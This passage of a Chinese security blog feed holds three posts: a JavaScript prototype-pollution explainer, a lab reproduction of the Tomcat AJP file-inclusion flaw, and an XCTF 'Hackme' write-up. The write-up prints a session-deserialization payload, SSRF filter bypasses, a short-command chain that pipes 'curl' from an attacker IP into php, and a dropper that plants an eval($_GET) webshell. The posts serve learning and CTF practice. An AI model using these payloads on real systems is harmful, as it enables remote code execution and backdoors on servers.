    <id>http://bai-ren-1.github.io/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/</id>
    <published>2020-03-17T06:08:27.000Z</published>
    <updated>2020-03-24T09:08:40.236Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JS原型污染链"><a href="#JS原型污染链" class="headerlink" title="JS原型污染链"></a>JS原型污染链</h1><p>JS中一种很有意思的漏洞，利用了JS中原型的特性，特此记录。</p><p>在正式进入之前先说一下chrome下如何清除console下面的历史记录。首先固定住console，然后ctrl+shift+j组合键再调出另一个console，随后选中application并清理里面local storge。随后关闭console并刷新即可。</p><h2 id="0x00-类的声明"><a href="#0x00-类的声明" class="headerlink" title="0x00 类的声明"></a>0x00 类的声明</h2><p>JS在ECS6之前没有类的概念，之前的类都是用funtion来声明的 。</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/3.png" alt></p><p>由上图可以看到，我先定义了一个Shabi类，并且类中具有属性name。随后实例化一个对象shabi，可以看到对象shabi中也具有了类Shabi中的属性a。</p><blockquote><p>通过new实例化对象即是通过构造方法来实例化对象。</p></blockquote><p>当然我们也能这么来写，定义了TestShabi类并实例化testshabi对象：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/2.png" alt></p><p>同样也能在对象中得到类中的属性，出现这个情况的原因是JS的继承特性，与之相关的就涉及到了原型链。</p><h2 id="0x01-原型链"><a href="#0x01-原型链" class="headerlink" title="0x01 原型链"></a>0x01 原型链</h2><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/1.png" alt></p><p>根据上面的图，我们就能知道了类、对象、原型对象、原型类等基本概念和关系，下面通过做一个实验来验证。</p><h2 id="0x02-实验探究"><a href="#0x02-实验探究" class="headerlink" title="0x02 实验探究"></a>0x02 实验探究</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在JS中只有类才有prototype属性，而对象却没有，对象有的是__proto__，它和类的prototype对应。且二者是等价的，都指向了对应的原型对象。</span><br></pre></td></tr></table></figure><p>根据上面的原型链的原理图，我声明了A类，然后实例化一个对象a。在类中有一个属性prototype，在实例化对象中有个属性<code>__proto__</code>，他们都指向了A的原型对象：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/4.png" alt></p><blockquote><p>原型对象是个对象，上例即为A.prototype，具体内容{constructor:f}，该原型对象只有一个构造方法。</p></blockquote><p>随后我们跟进这个原型对象A.prototype，因为他是一个原型对象（即对象类型），于是他也会具有他的原型对象即<code>A.prototype.__proto__</code>。我们直接点开属性列表，就可以看到他的原型对象（原型对象A.protype的原型对象，对应上图中的Object.prototype）：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/6.png" alt></p><p>我们也可以通过这样来验证：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/5.png" alt></p><p>最后我们看Object.prototype可以看到它的原型对象为空，至此整条原型链完毕：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/7.png" alt></p><blockquote><p>原型链 ：a -&gt; A.prototype -&gt; Object.protype -&gt; null</p></blockquote><h2 id="0x03-原型链污染"><a href="#0x03-原型链污染" class="headerlink" title="0x03 原型链污染"></a>0x03 原型链污染</h2><h3 id="1-属性污染"><a href="#1-属性污染" class="headerlink" title="1) 属性污染"></a>1) 属性污染</h3><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/8.png" alt></p><p>上图就是一个简单的对原型链进行属性的污染。首先我们定义一个shabi类，它里面没有属性。然后我们实例化一个a对象，可以看到他是一个空对象。</p><p>那如果我们对a的原型对象进行操作呢？上面我给a的原型对象加了一个name属性，并赋值。可以看到，在“污染”了原型对象后，我再重新实例化b对象。虽然b对象也是空对象，但是因为原型链和被“污染”的原型对象的存在，它可以输出name属性。至此，就是一个简单的原型链污染，控制了b对象的name属性。</p><h3 id="2-函数污染"><a href="#2-函数污染" class="headerlink" title="2) 函数污染"></a>2) 函数污染</h3><p>首先看一下JS中的继承。我先定义了一个Shabi作为父类，其中具有方法能输出字符串。随后我定义一个空子类ShabiSon。通过prototype让子类继承父类。此时我实例化一个sona对象，可以看到它因为具有了父类的方法。</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/9.png" alt></p><p>那我们就开始操作，给他进行方法的“污染”。实例化对象儿子a即sona很生气，想让其他儿子也变笨。于是我们通过sona对象的<code>__proto__</code>属性指向了父类Shabi，并改写其中的ShowName方法。</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/10.png" alt></p><p>可以看到，我们通过改写父类的方法，成功让其他继承了父类的聪明的宝宝变成了shabi。</p><h2 id="0x04-CTF利用"><a href="#0x04-CTF利用" class="headerlink" title="0x04 CTF利用"></a>0x04 CTF利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染.</span><br></pre></td></tr></table></figure><p>原型链污染一般会出现在<code>对象或数组</code>的<code>键名或属性名</code>可控,而且是<code>赋值语句</code>的情况下 ：例如<strong>对象合并merge、对象clone</strong>。 </p><p>CTF题目参考链接：</p><p><a href="https://www.freebuf.com/column/216381.html" target="_blank" rel="noopener">https://www.freebuf.com/column/216381.html</a> </p><p><a href="https://www.freebuf.com/articles/web/200406.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/200406.html</a> </p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>最近事情太多了，应接不暇。希望早点结束这些麻烦事情，早日轻松，冲冲冲！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JS原型污染链&quot;&gt;&lt;a href=&quot;#JS原型污染链&quot; class=&quot;headerlink&quot; title=&quot;JS原型污染链&quot;&gt;&lt;/a&gt;JS原型污染链&lt;/h1&gt;&lt;p&gt;JS中一种很有意思的漏洞，利用了JS中原型的特性，特此记录。&lt;/p&gt;
&lt;p&gt;在正式进入之前先说一下c
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Tomcat文件包含</title>
    <link href="http://bai-ren-1.github.io/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://bai-ren-1.github.io/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-03-13T07:01:41.000Z</published>
    <updated>2020-03-17T06:07:15.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat文件包含"><a href="#Tomcat文件包含" class="headerlink" title="Tomcat文件包含"></a>Tomcat文件包含</h1><p>漏洞地址：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-1938" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-1938</a> ，由于Tomcat处理ajp协议存在缺陷导致攻击者可以构造恶意数据包进行文件包含，获取Tomcat服务器上的文件信息。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里我使用的是ubuntu的docker来搭建我们的Tomcat环境，首先通过docker search找到tomcat具体8.5版本的镜像，然后通过docker pull拉取镜像。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker search tomcat-<span class="number">8.5</span>.<span class="number">32</span></span><br><span class="line">docker pull duonghuuphuc/tomcat-<span class="number">8.5</span>.<span class="number">32</span></span><br><span class="line">docker images</span><br></pre></td></tr></table></figure><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/5.png" alt></p><p>镜像拉取完成后可以通过docker iamges来查看镜像，随后我们运行我们的tomcat镜像。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:8080 -p 8009:8009 --name bairen duonghuuphuc/tomcat-8.5.32</span><br></pre></td></tr></table></figure><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png" alt></p><p>开启了镜像的8080和8009（处理ajp协议的端口）端口，验证是否开启成功：</p><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png" alt></p><p>可以看到nmap成功扫描出目标靶机开启了8009端口处理ajp协议。</p><h2 id="攻击环境"><a href="#攻击环境" class="headerlink" title="攻击环境"></a>攻击环境</h2><p> EXP来源：<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a> </p><p>我打完EXP忘记截图了，重新开启一下docker镜像实例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start f283f2dd7396</span><br></pre></td></tr></table></figure><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/6.png" alt></p><p>然后执行我们的EXP，可以看到成功读取出/WEB-INF/web.xml的信息：</p><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/7.png" alt></p><p>关闭docker环境：</p><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/8.png" alt></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>记录一下，用来学习。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Tomcat文件包含&quot;&gt;&lt;a href=&quot;#Tomcat文件包含&quot; class=&quot;headerlink&quot; title=&quot;Tomcat文件包含&quot;&gt;&lt;/a&gt;Tomcat文件包含&lt;/h1&gt;&lt;p&gt;漏洞地址：&lt;a href=&quot;https://cve.mitre.org/cg
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>XCTF之Hackme</title>
    <link href="http://bai-ren-1.github.io/2020/03/10/XCTF%E4%B9%8BHackme/"/>
    <id>http://bai-ren-1.github.io/2020/03/10/XCTF%E4%B9%8BHackme/</id>
    <published>2020-03-10T08:07:43.000Z</published>
    <updated>2020-03-18T08:14:24.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF之Hackme"><a href="#XCTF之Hackme" class="headerlink" title="XCTF之Hackme"></a>XCTF之Hackme</h1><p>因为疫情在家没事做在写Django的博客。然后刚好Xctf首战新春战疫开始，就看了一下。这道题参考了很多题目比较综合，特此记录。环境已经关闭所以没有源码，核心的绕法和payload的意义会详细解释。最核心考点少于四字的命令执行具体情景和 hitcon 2017类似。</p><p>思路分析</p><p>下载源码审计，看到了可以构造反序列化控制admin的值为1。执行成功反序列化后进入核心题目，核心思路是绕过ssrf后进行一个命令字数小于4的命令执行。</p><h2 id="参考题目"><a href="#参考题目" class="headerlink" title="参考题目"></a>参考题目</h2><p>hitcon 2017 revenge <a href="https://findneo.github.io/171110Bypass4CLimit/" target="_blank" rel="noopener">https://findneo.github.io/171110Bypass4CLimit/</a></p><p>Byte 2019 CTF  <a href="https://blog.csdn.net/a3320315/article/details/102989485/" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/102989485/</a> </p><h2 id="Part1-Session反序列化"><a href="#Part1-Session反序列化" class="headerlink" title="Part1 - Session反序列化"></a>Part1 - Session反序列化</h2><blockquote><p> Session反序列化漏洞：在<strong>设置 session 和读取 session 两个阶段</strong>中，若使用了不同的序列化方法，将产生任意对象注入，进而导致反序列化漏洞。 </p><p>PHP 获取到 session 字符串后，就开始查找<strong>第一个 |</strong>（竖线），用竖线将字符串分割成“键名”和“键值”， 并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，再去找下一个竖线，执行同样的操作，直到成功。（可利用点：<strong>键值天生就是如果是序列化字符的话，可以直接被反序列。可用来绕过某些构造方法的变量值限定</strong>）</p></blockquote><h4 id="1-PHP-Session-序列化及反序列化处理器"><a href="#1-PHP-Session-序列化及反序列化处理器" class="headerlink" title="1) PHP Session 序列化及反序列化处理器"></a>1) PHP Session 序列化及反序列化处理器</h4><p>PHP 内置了多种处理器用于<strong>存取 $_SESSION 数据</strong>时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：</p><table><thead><tr><th>处理器</th><th>对应的存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_serialize (php&gt;=5.5.4)</td><td>经过 serialize() 函数反序列处理的数组</td></tr></tbody></table><h4 id="2-配置选项-session-serialize-handler"><a href="#2-配置选项-session-serialize-handler" class="headerlink" title="2) 配置选项 session.serialize_handler"></a>2) 配置选项 session.serialize_handler</h4><p>PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler<span class="string">"php"</span>PHP_INI_ALL</span><br></pre></td></tr></table></figure><h4 id="3-安全隐患"><a href="#3-安全隐患" class="headerlink" title="3) 安全隐患"></a>3) 安全隐患</h4><p>通过上面对存储格式的分析，如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据：）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'ryat'</span>] = <span class="string">'|O:8:"stdClass":0:&#123;&#125;'</span>;</span><br></pre></td></tr></table></figure><p>例如上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"ryat"</span>;s:<span class="number">20</span>:<span class="string">"|O:8:"</span>stdClass<span class="string">":0:&#123;&#125;"</span>;&#125;</span><br></pre></td></tr></table></figure><p>在<strong>读取数据时</strong>如果用的反序列化处理器不是 php_serialize，而<strong>是 php</strong> 的话，那么反序列化后的数据将会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var_dump($_SESSION);</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"a:1:&#123;s:4:"</span>ryat<span class="string">";s:20:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">  object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到，通过注入 <code>|</code> 字符伪造了对象的序列化数据，成功实例化了 stdClass 对象：）</p><blockquote><p>即是PHP 获取到 session 字符串后，就开始查找第一个 |（竖线），用竖线将字符串分割成“键名”和“键值”， 并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，再去找下一个竖线，执行同样的操作，直到成功。 </p></blockquote><h3 id="4-回归题目分析"><a href="#4-回归题目分析" class="headerlink" title="4)回归题目分析"></a>4)回归题目分析</h3><p>我们访问upload文件可以看到，它包含的是他目录下面的<code>init.php</code>。其中存入<code>session</code>使用的是<code>php_serialize</code>模式</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/8.png" alt></p><p>然后我们看我们的目标<code>/core/index.php</code>，里面也包含了一个<code>init.php</code>进行session配置，不过这个<code>init.php</code>跟上面的不一样</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/9.png" alt></p><p>这就导致<code>/core/index.php</code>访问session时和刚刚存储使用的session不同，导致解析漏洞。<strong>会自动将|后面的进行反序列化</strong>，这就实例化了info类，绕过他的构造函数对admin的控制了，成功让admin为1。</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/10.png" alt></p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"sign"</span>: <span class="string">'|O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";s:5:"shabi";&#125;'</span></span><br></pre></td></tr></table></figure><p>获取到源码并进入Part2，进入ssrf的绕过：</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/11.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//data:@127.0.0.1/baidu.com?,payload</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//data:@127.0.0.1/plain;base64,payload</span></span><br></pre></td></tr></table></figure><h2 id="Part2-SSRF绕法"><a href="#Part2-SSRF绕法" class="headerlink" title="Part2 - SSRF绕法"></a>Part2 - SSRF绕法</h2><h3 id="1-参考连接"><a href="#1-参考连接" class="headerlink" title="1) 参考连接"></a>1) 参考连接</h3><p>【SSRF】如何绕过filter_var, preg_match和 parse_url <a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a> </p><h3 id="2-回归题目分析"><a href="#2-回归题目分析" class="headerlink" title="2)回归题目分析"></a>2)回归题目分析</h3><ul><li>FILTER_VALIDATE_URL 过滤器把值作为URL来验证 。</li><li>compress.zlib://data: 绕过 preg_match 对直接使用data协议data://的绕过 。</li><li>@：绕过 preg_match 对域名为127.0.0.1的绕过。</li><li>file_get_content：绕过本地文件读取直接接受payload的值。</li></ul><blockquote><p>关于绕过filter_var和parse_url，在file_get_contents的情况下，可以用data://伪协议来绕过，对于这样的形式data://text/plain;base64,xxxxx，parse_url会将text作为host，并且PHP对MIME不敏感，改为这样data://baidu.com/plain;base64,xxxxx就能绕过，并且file_get_contents能直接读取到xxxx的内容。由于题目已经禁止了以data开头，所以我们可以用compress.zlib</p></blockquote><h2 id="Linux特性"><a href="#Linux特性" class="headerlink" title="Linux特性"></a>Linux特性</h2><p>EXP里面使用的了一些Linux特性，这里简单的复现一下。</p><h3 id="1-命令可以通过-符号断续执行"><a href="#1-命令可以通过-符号断续执行" class="headerlink" title="1) 命令可以通过 \ 符号断续执行"></a>1) 命令可以通过 \ 符号断续执行</h3><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/1.png" alt></p><p>通过\对命令进行截断，我们最后可以断续的构造出<code>echo 111</code>这个命令。</p><h3 id="2-通过重定向-gt-符号新建文件"><a href="#2-通过重定向-gt-符号新建文件" class="headerlink" title="2) 通过重定向 &gt; 符号新建文件"></a>2) 通过重定向 &gt; 符号新建文件</h3><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/2.png" alt></p><p>重定向就不说了，简单标注 &gt; 和 &gt;&gt; 的区别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; 是追加；</span><br><span class="line">&gt; 是覆盖；</span><br></pre></td></tr></table></figure><p>上例中我通过 &gt; 新建了一个空文件 <code>shabi</code>。</p><h3 id="3-通过命令-sh-执行文件内容"><a href="#3-通过命令-sh-执行文件内容" class="headerlink" title="3) 通过命令 sh 执行文件内容"></a>3) 通过命令 sh 执行文件内容</h3><p>当文件里面的内容是系统命令时，我们能通过 <code>sh 文件名</code>的形式来调用里面命令</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/3.png" alt></p><p>上例我新建shabi文件并写入 <code>echo &#39;you are shabi&#39;</code>，然后我通过<code>sh shabi</code>可见成功执行了其中的命令并打印出内容。</p><h2 id="Part3-命令执行绕法"><a href="#Part3-命令执行绕法" class="headerlink" title="Part3 - 命令执行绕法"></a>Part3 - 命令执行绕法</h2><p>核心payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">pos0 = random.choice(<span class="string">'efgh'</span>)</span><br><span class="line">pos1 = random.choice(<span class="string">'hkpq'</span>)</span><br><span class="line">pos2 = <span class="string">'g'</span>  <span class="comment"># 随意选择字符</span></span><br><span class="line">payload = [</span><br><span class="line"><span class="string">'&gt;dir'</span>,</span><br><span class="line"><span class="comment"># 创建名为 dir 的文件</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;%s\&gt;'</span> % pos0,</span><br><span class="line"><span class="comment"># 假设pos0选择 f , 创建名为 f&gt; 的文件</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;%st-'</span> % pos1,</span><br><span class="line"><span class="comment"># 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span></span><br><span class="line"><span class="comment"># 因为alphabetical序中t&gt;s</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;sl'</span>,</span><br><span class="line"><span class="comment"># 创建名为 &gt;sl 的文件；到此处有四个文件，</span></span><br><span class="line"><span class="comment"># ls 的结果会是：dir f&gt; kt- sl</span></span><br><span class="line"></span><br><span class="line"><span class="string">'*&gt;v'</span>,</span><br><span class="line"><span class="comment"># * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span></span><br><span class="line"><span class="comment">#  dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span></span><br><span class="line"><span class="comment"># 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;rev'</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span></span><br><span class="line"><span class="string">'*v&gt;%s'</span> % pos2,</span><br><span class="line"></span><br><span class="line"><span class="comment"># 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。体会一下。</span></span><br><span class="line"><span class="comment"># 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span></span><br><span class="line"><span class="comment"># 续行分割 curl 0x11223344|php 并逆序写入</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;p'</span>,</span><br><span class="line"><span class="string">'&gt;ph\\'</span>,</span><br><span class="line"><span class="string">'&gt;\|\\'</span>,</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">8</span>:<span class="number">10</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">6</span>:<span class="number">8</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">4</span>:<span class="number">6</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">2</span>:<span class="number">4</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">0</span>:<span class="number">2</span>],</span><br><span class="line"><span class="string">'&gt;\ \\'</span>,</span><br><span class="line"><span class="string">'&gt;rl\\'</span>,</span><br><span class="line"><span class="string">'&gt;cu\\'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'sh '</span> + pos2,</span><br><span class="line"><span class="comment"># sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，</span></span><br><span class="line"><span class="comment"># 虽然 f 的文件头部会有杂质，但不影响有效命令的执行</span></span><br><span class="line"><span class="string">'sh '</span> + pos0,</span><br><span class="line"><span class="comment"># sh f 执行curl命令，下载文件，写入木马。</span></span><br></pre></td></tr></table></figure><p>1.当payload执行到<strong>第五行</strong>命令时，可以看出：</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/4.png" alt></p><ul><li>创建了五个文件dir、f&gt;、kt-、sl、v，目前仅v是内容非空的，其他为空。</li><li>v中的内容如上<code>f&gt;  kt- sl</code>。</li><li><code>*&gt;v</code>中<strong>*起通配符作用</strong>相当于<code>dir&gt;v</code>，即v的内容<code>f&gt; kt- sl</code>。</li></ul><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/6.png" alt></p><p>2.当继续执行<strong>第六行</strong>命令直到发生魔法那行命令：</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/5.png" alt></p><ul><li>新创建了rev空文件，用来起通配作用。</li><li>使用<code>*v&gt;g</code>，这里注意<strong>*起通配符作用</strong>相当于 <code>rev v&gt;g</code>，即把<code>v</code>中内容反序写入g，即g的内容<code>ls -tk &gt;f</code>，目的是为了把命令拆分成文件名，并因为ls的-t选项按<strong>时间排序</strong>，来达成写入文件命令的作用。</li></ul><p>3.当从下面新的截断命令开始到继续执行完命令：</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/7.png" alt></p><p>可以看到ls -t的作用就能把这些<strong>通过时间来逆序</strong>把文件名拼接成有顺序的命令。</p><ul><li><code>sh pos2</code>即<code>sh g</code>，通过执行f的内容ls -tk并写入到文件f中</li><li><code>sh pos0</code>即<code>sh f</code>，即执行f的内容（ls -tk的结果，即curl那条命令）去访问服务器的php文件并下载</li></ul><p>4.我们在服务器部署好马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;?php file_put_contents(\"hh.php\", \"&lt;?php eval(\\\$_GET[c]);?&gt;\");?&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面执行命令后就会请求并下载这个马，我们在访问沙盒下生成的hh.php就能获得flag了</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>附上这次比赛的wp：<a href="https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/。" target="_blank" rel="noopener">https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/。</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XCTF之Hackme&quot;&gt;&lt;a href=&quot;#XCTF之Hackme&quot; class=&quot;headerlink&quot; title=&quot;XCTF之Hackme&quot;&gt;&lt;/a&gt;XCTF之Hackme&lt;/h1&gt;&lt;p&gt;因为疫情在家没事做在写Django的博客。然后刚好Xctf首战新春战
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
